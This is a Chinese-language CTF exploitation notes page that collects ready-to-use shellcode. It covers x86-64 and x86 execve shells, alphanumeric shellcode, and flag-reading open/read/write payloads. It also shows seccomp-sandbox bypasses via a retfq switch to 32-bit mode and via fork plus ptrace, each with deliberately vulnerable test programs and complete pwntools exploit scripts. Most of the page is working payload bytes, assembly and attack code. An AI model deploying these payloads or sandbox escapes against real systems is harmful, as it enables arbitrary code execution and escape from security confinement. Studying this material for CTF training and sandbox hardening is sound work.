---
title: shellcode
date: 2024-08-30 22:11:42
---

# shellcode
关于系统调用号：[syscall](/pwn/syscall)

下面给出了收集到的shellcode，将部分可能需要修改的shellcode反编译出来了，一些有特殊限制的就没有给出反编译结果
## 64位
### execve
> 一般没有禁用execve就会用execve来拿shell，如果禁了(KILL)就不要想着拿shell了，因为你拿到的shell输入的命令也要用execve，同样会被禁
#### scanf可读取 22字节
```python
b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
```
```x86asm
xor    rsi, rsi
push   rsi
movabs rdi, 0x68732f2f6e69622f
push   rdi
push   rsp
pop    rdi
mov    al, 0x3b
cdq    
syscall
```

#### 纯ascii字符
```python
b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
```

### orw
#### open read wirte
```python
b"hflagH\x89\xe71\xf6j\x02X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05"
```
```x86asm
push   0x67616c66
mov    rdi, rsp
xor    esi, esi
push   0x2
pop    rax
syscall 
mov    rdi, rax
mov    rsi, rsp
mov    edx, 0x100
xor    eax, eax
syscall 
mov    edi, 0x1
mov    rsi, rsp
push   0x1
pop    rax
syscall
```

#### openat sendfile
> open系统调用实际上是调用了openat，如果open被禁了就直接用openat吧;同时sendfile还可以同时进行读写，真不错
```python
b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05'
```
```x86asm
mov rax,0x0067616c662f
push rax
mov rsi,rsp
xor rdx,rdx
mov rax,257
syscall
xor rdi,rdi
inc rdi
mov rsi,rax
xor rdx,rdx
mov r10,0x100 # 读取文件的长度,不够就加
mov rax,40
syscall
```

#### openat readv writev
> 也可以用，将sendfile变成了读写两个系统调用，同时利用栈作为缓冲区
```python
b'H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H\x89\xc7h\x00\x01\x00\x00H\x89\xe3H\x81\xeb\x08\x01\x00\x00SH\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x13\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x14\x00\x00\x00\x0f\x05'
```
```x86asm
mov rax,0x0067616c662f
push rax
mov rsi,rsp
xor rdx,rdx
mov rax,257
syscall
mov rdi,rax
push 0x100 # 读入大小由这个控制
mov rbx,rsp
sub rbx,0x108 # 为读入大小加8
push rbx
mov rsi,rsp
mov rdx,1
mov rax,19
syscall
mov rdi,1
mov rsi,rsp
mov rdx,1
mov rax,20
syscall
```

#### openat2 read write
> open,openat都被禁了，用openat2，但要注意openat2系统调用是在kernel5.6版本引入的，因此ubuntu20.04及以下的版本是不支持该系统调用的
```python
b'H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05'
```
```x86asm
mov rax, 0x67616c66 # 路径
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push SYS_openat2 # pwntools预定义的系统调用号,也可以手动查
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
```

#### mmap fstat read write
> 有时候程序会禁用open,openat,openat2这三个打开文件的方法，但是没有禁用fstat系统调用，该系统调用号在32位的环境下为open系统调用，于是我们就可以通过retfq指令将程序转到32位环境下运行，利用32位的open系统调用打开flag文件

注意，如果是以下含有arch检测的沙箱无法通过这种方式绕过，一般通过seccomp_rule_add生成的就是这种
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
 0008: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

下面这种没有对arch的检测，可以绕过
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x05 0x00 0x00000005  if (A == fstat) goto 0007
 0002: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0007
 0003: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0007
 0004: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0007
 0005: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0007
 0006: 0x06 0x00 0x00 0x00000000  return KILL
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

下面是用于测试的程序
```c
// gcc ./pwn.c -o pwn

#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/bpf.h>
#include <sys/prctl.h>

void sandbox()
{
    // 这种加seccomp的方式无法通过切换为32位进行绕过，因为还会检测架构
    // scmp_filter_ctx ctx;
    // ctx = seccomp_init(SCMP_ACT_KILL);
    // seccomp_arch_add(ctx,SCMP_ARCH_X86); // 加了这一行也没用，只会允许32位的fstat系统调用，而不是系统调用号为5的open
    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(fstat),0);
    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(read),0);
    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(write),0);
    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(mmap),0);
    // seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(exit_group),0);
    // seccomp_load(ctx);

    // 如果采用手写BPF过滤规则，并利用prctl设置seccomp的方式，就有可能漏掉对arch的检测，因此可以绕过
    struct sock_filter filter[]={
        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(fstat), 5, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(read), 4, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(write), 3, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(mmap), 2, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(exit_group), 1, 0),
        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW)
    };

    struct sock_fprog prog={
        .len=sizeof(filter)/sizeof(filter[0]),
        .filter=filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}

int main()
{
    sandbox();
    void *buf = (void *) syscall(SYS_mmap,0x500000,0x1000,7,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    syscall(SYS_write,1,"shellcode: ",11);
    size_t len = syscall(SYS_read,0,buf,0x1000);
    for(int i=0; i<len-1 ; i++)
    {
        if(buf[i]<=0x1f || buf[i]>= 0x7f)
            syscall(SYS_exit_group,-1);
    }
    ((void (*)())buf)();
    syscall(SYS_exit_group,0);
}
```

下面的exp可以打通上面的程序

```python
from pwn import *
context.log_level = 'debug'

p = process('./pwn')

append = '''
/* 机器码: 52 5a */
push rdx
pop rdx
'''

shellcode_x86 = '''
/*fp = open("flag")*/
mov esp,0x40404140

/* s = "flag" */
push 0x67616c66

/* ebx = &s */
push esp
pop ebx

/* ecx = 0 */
xor ecx,ecx

mov eax,5
int 0x80

mov ecx,eax
'''

shellcode_flag = '''
/* retfq:  mode_32 -> mode_64*/
push 0x33
push 0x40404089
retfq

/*read(fp,buf,0x70)*/
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall

/*write(1,buf,0x70)*/
mov rdi,1
mov rax,1
syscall
'''

# 0x40404040 为32位shellcode地址
shellcode_mmap = '''
push rdx /* 将这段shellcode的起始地址保存到rbx中,rdx根据call的寄存器进行修改 */
pop rbx

/*mmap(0x40404040,0x7e,7,33,-1,0)*/
push 0x40404040 /*set rdi*/
pop rdi

push 0x7e /*set rsi*/
pop rsi

push 0x40 /*set rdx*/
pop rax
xor al,0x47
push rax
pop rdx

push 0x40 /*set r10*/
pop rax
xor al,0x61
push rax
pop r10

push 0x40 /*set r8*/
pop rax
xor al,0x40
push rax
pop r8

push rax /*set r9*/
pop r9

/*syscall*/
/* syscall 的机器码是 0f 05, 都是不可打印字符. */
/* 用异或运算来解决这个问题: 0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. */
/* 其中 0x52,0x5a 由 append 提供. */
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x3b],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x3c],cl

push 0x22 /*set rcx*/
pop rcx

push 0x40/*set rax*/
pop rax
xor al,0x49
'''

shellcode_read = '''
/*read(0,0x40404040,0x70)*/

push 0x40404040 /*set rsi*/
pop rsi

push 0x40 /*set rdi*/
pop rax
xor al,0x40
push rax
pop rdi

xor al,0x40 /*set rdx*/
push 0x70
pop rdx

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x61],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x62],cl

push rdx /*set rax*/
pop rax
xor al,0x70
'''

shellcode_retfq = '''
/*mode_64 -> mode_32*/
push rbx
pop rax

xor al,0x40

push 0x72
pop rcx
xor byte ptr[rax+0x4a],cl
push 0x68
pop rcx
xor byte ptr[rax+0x4a],cl
push 0x47
pop rcx
sub byte ptr[rax+0x4b],cl
push 0x48
pop rcx
sub byte ptr[rax+0x4b],cl
push rdi
push rdi
push 0x23
push 0x40404040
pop rax
push rax
'''

shellcode_x86 = asm(shellcode_x86 ,arch = 'i386')
shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')
shellcode = ''

# mmap
shellcode += shellcode_mmap
shellcode += append

# read shellcode
shellcode += shellcode_read
shellcode += append

# mode_64 -> mode_32
shellcode += shellcode_retfq
shellcode += append

shellcode = asm(shellcode,arch = 'amd64',os = 'linux')

p.recvuntil("shellcode: ")

p.sendline(shellcode)
sleep(3)

p.sendline(shellcode_x86 + 0x29*b'\x90' + shellcode_flag)
p.interactive()
```

#### fstat read write
> 比上一题少了一个mmap，这种一般会提前用mmap申请一块rwx的内存，并且内存地址是小于32位地址长度限制的

测试程序
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/bpf.h>
#include <sys/prctl.h>

void sandbox()
{
    struct sock_filter filter[]={
        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(fstat), 4, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(read), 3, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(write), 2, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(exit_group), 1, 0),
        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW)
    };

    struct sock_fprog prog={
        .len=sizeof(filter)/sizeof(filter[0]),
        .filter=filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}

int main()
{
    char buf[0x1000];
    srand(time(0));
    int res = rand() % 0x7fffffff;
    char *dest = (char *) syscall(SYS_mmap,res,0x1000,7,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    sandbox();
    syscall(SYS_write,1,"shellcode: ",11);
    size_t len = syscall(SYS_read,0,buf,0x1000);
    for(int i = 0 ; i<len-1 ; i++)
    {
        if(buf[i]<=0x1f || buf[i]>= 0x7f)
            syscall(SYS_exit_group,-1);
    }
    strcpy(dest,buf);
    ((void (*)())dest)();
    syscall(SYS_exit_group,0);
}
```
mmap申请的地址是随机的，但是肯定小于32位地址长度限制
并且会检测输入是否为可打印字符

```python
from pwn import *
import ctypes

context.log_level = "debug"

clibc = ctypes.CDLL("/lib/libc.so.6")
addr = 0
dest = 0

# 由于shellcode中用到了addr，所以需要addr为可打印字符，因此需要爆破一下
while True:
    p = process("./pwn3")
    clibc.srand(clibc.time(0))
    dest = clibc.rand() % 0x7FFFFFFF
    dest = dest & 0xFFFFF000 # mmap内存对齐
    addr = dest + 0x550
    if not (isprint(p32(addr)[0]) and isprint(p32(addr)[1]) and isprint(p32(addr)[2]) and isprint(p32(addr)[3])):
        p.close()
        continue
    break

shellcode_x86 = f'''
mov esp,{addr+0x100}
push 0x67616c66
push esp
pop ebx
xor ecx,ecx
mov eax,5
int 0x80
mov ecx,eax
'''

shellcode_flag = f'''
push 0x33
push {addr+0x49}
retfq
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall
mov rdi,1
mov rax,1
syscall
'''

shellcode_read = f'''
push rdx /* 同样的,将本段shellcode的起始位置保存到rbx中 */
pop rbx

/*read(0,addr,0x70)*/

push {addr} /*set rsi*/
pop rsi

push 0x40 /*set rdi*/
pop rax
xor al,0x40
push rax
pop rdi

xor al,0x40 /*set rdx*/
push 0x70
pop rdx

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x26],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x27],cl

push rdx /*set rax*/
pop rax
xor al,0x70
'''

append = '''
/* 52 5a */
push rdx
pop rdx
'''

shellcode_retfq = f'''
/*mode_64 -> mode_32*/

push rbx
pop rax

push 0x72
pop rcx
xor byte ptr[rax+0x4d],cl
push 0x68
pop rcx
xor byte ptr[rax+0x4d],cl
push 0x47
pop rcx
sub byte ptr[rax+0x4e],cl
push 0x48
pop rcx
sub byte ptr[rax+0x4e],cl
push rdi
push rdi
push 0x23
push {addr}
pop rax
push rax
'''

shellcode_x86 = asm(shellcode_x86, arch='i386')
shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')

shellcode = shellcode_read + append
shellcode += shellcode_retfq + append
shellcode = asm(shellcode,arch = 'amd64',os = 'linux')

p.recvuntil(b'shellcode: ')
p.send(shellcode)
sleep(3)
p.sendline(shellcode_x86 + 0x29*b'\x90' + shellcode_flag)

p.interactive()
```

### fork ptrace
> 有时我们会遇到返回TRACE的沙箱，并且题目没有禁用fork和ptrace，这就给了我们绕过沙箱的手段
下面是一个示例程序，我们可以看到，题目对execve,execveat,open,openat,openat2都加了限制，但返回的不是KILL，而是TRACE;
于是我们就可以通过fork加ptrace的方式绕过沙箱，拿到shell
```c
// gcc ./pwn.c -o pwn -lseccomp 

#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <seccomp.h>
#include <time.h>

struct timespec t = {1,0};

void sandbox()
{
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(0),SCMP_SYS(execve),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(1),SCMP_SYS(execveat),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(2),SCMP_SYS(open),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(3),SCMP_SYS(openat),0);
    seccomp_rule_add(ctx,SCMP_ACT_TRACE(4),SCMP_SYS(openat2),0);
    seccomp_load(ctx);
}

int main()
{
    sandbox();

    // fork出子进程
    pid_t pid = syscall(SYS_fork);

    if(pid<0)
    {
        // fork错误直接退出
        syscall(SYS_write,STDOUT_FILENO,"fork error!\n",12);
        syscall(SYS_exit,0);
    }

    if(pid==0)
    {
        // 子进程
        // 不断执行sleep(1),printf("child execve\n"),execve("/bin/bash",0,0)
        while(1)
        {
            syscall(SYS_nanosleep,t,0);
            syscall(SYS_write,STDOUT_FILENO,"child execve\n",13);
            syscall(SYS_execve,"/bin/bash",0,0);
        }
    }
    else
    {
        // 父进程
        // 首先attach到子进程上
        syscall(SYS_ptrace,PTRACE_ATTACH,pid,0,0);
        syscall(SYS_write,STDOUT_FILENO,"father attach\n",14);
        while(1)
        {
            // 不断等待子进程改变状态，在本题即为等待子进程触发seccomp然后stop
            syscall(SYS_wait4,pid,0,0,0);
            // 设置跟踪seccomp,并且在子进程触发seccomp时stop子进程
            syscall(SYS_ptrace,PTRACE_SETOPTIONS,pid,0,PTRACE_O_TRACESECCOMP);
            // 使子进程继续执行，并且此时没有了seccomp的检测，即成功绕过seccomp
            syscall(SYS_ptrace,PTRACE_CONT,pid,0,0);
        }
    }
}
```
编写成shellcode如下,去掉了中间用write输出的提示信息,长度为203字节
```python
b'H\xc7\xc09\x00\x00\x00\x0f\x05H\x85\xc0\x0f\x88\xad\x00\x00\x00H\x83\xf8\x00tiI\x89\xc0L\x89\xc6H\xc7\xc0e\x00\x00\x00H\xc7\xc7\x10\x00\x00\x00H1\xd2M1\xd2\x0f\x05L\x89\xc7H1\xf6H1\xd2M1\xd2H\xc7\xc0=\x00\x00\x00\x0f\x05H\xc7\xc7\x00B\x00\x00L\x89\xc6H1\xd2I\xc7\xc2\x80\x00\x00\x00H\xc7\xc0e\x00\x00\x00\x0f\x05H\xc7\xc7\x07\x00\x00\x00L\x89\xc6H1\xd2M1\xd2H\xc7\xc0e\x00\x00\x00\x0f\x05\xeb\xb3j\x00j\x01H\x89\xe7H1\xf6H\xc7\xc0#\x00\x00\x00\x0f\x05H\xc7\xc0h\x00\x00\x00PH\xb8/bin/basPH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05\xeb\xc2H\xc7\xc0<\x00\x00\x00H1\xff\x0f\x05'
```
汇编也放一下
```x86asm
_start:
    /* fork() */
    mov rax,57
    syscall

    /* if(pid<0) exit(0) */
    test rax,rax
    js _exit

    /* if(pid==0) */
    cmp rax,0
    je child_process

parent_process:
    /* save pid with r8 */
    mov r8,rax
    mov rsi,r8

    /* ptrace(PTRACE_ATTACH,pid,0,0); */
    mov rax,101
    mov rdi,0x10
    xor rdx,rdx
    xor r10,r10
    syscall

monitor_child:
    /* wait4(pid,0,0,0); */
    mov rdi,r8
    xor rsi,rsi
    xor rdx,rdx
    xor r10,r10
    mov rax,61
    syscall

    /* ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_TRACESECCOMP) */
    mov rdi,0x4200 /* PTRACE_SETOPTIONS */
    mov rsi,r8
    xor rdx,rdx
    mov r10,0x00000080 /* PTRACE_O_TRACESECCOMP */
    mov rax,101
    syscall

    /* ptrace(PTRACE_CONT,pid,0,0) */
    mov rdi,0x7
    mov rsi,r8
    xor rdx,rdx
    xor r10,r10
    mov rax,101
    syscall

    jmp monitor_child

child_process:
    /* syscall(SYS_nanosleep,t,0) */
    push 0
    push 1
    mov rdi,rsp
    xor rsi,rsi
    mov rax,0x23
    syscall

    /* execve("/bin/bash",0,0) */
    mov rax,0x0068 /* "h\x00" */
    push rax
    mov rax,0x7361622f6e69622f /* "/bin/bas" */
    push rax
    mov rdi,rsp
    mov rsi,0
    xor rdx,rdx
    mov rax,59
    syscall

    jmp child_process

_exit:
    /* exit(0) */
    mov rax,60
    xor rdi,rdi
    syscall

```

注意一下这样最终拿到的shell仍然是在沙箱环境下的，除了基本的cd,pwd,echo，很多命令执行不了，而且echo也只有部分功能
这边给出ls和读flag的方法
```shell
# ls
echo *

# cat flag
read -r f < flag
echo ${f}
```

## 32位
### execve
#### 较短 21字节
> 由于中间有个'\x0b'，所以scanf读不进去
```python
b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```
```x86asm
push   0xb
pop    eax
cdq
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
int    0x80
```

#### scanf可读取
> 较长，但是可以被scanf读取
```python
b"\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh"
```

#### 纯ascii字符
```python
b"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"
```

# 参考资料
[CTF中常见的C语言输入函数截断属性总结](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/)
[Ubuntu 发行版本与内核对应关系](https://blog.csdn.net/FLM19990626/article/details/129154795)
[shellcode进阶之手写shellcode](https://xz.aliyun.com/t/13813)
[栈沙箱学习之orw](https://xz.aliyun.com/t/12787)
[shellcode 的艺术](https://xz.aliyun.com/t/6645)
[各种seccomp绕过](https://blog.csdn.net/qq_54218833/article/details/134205383)
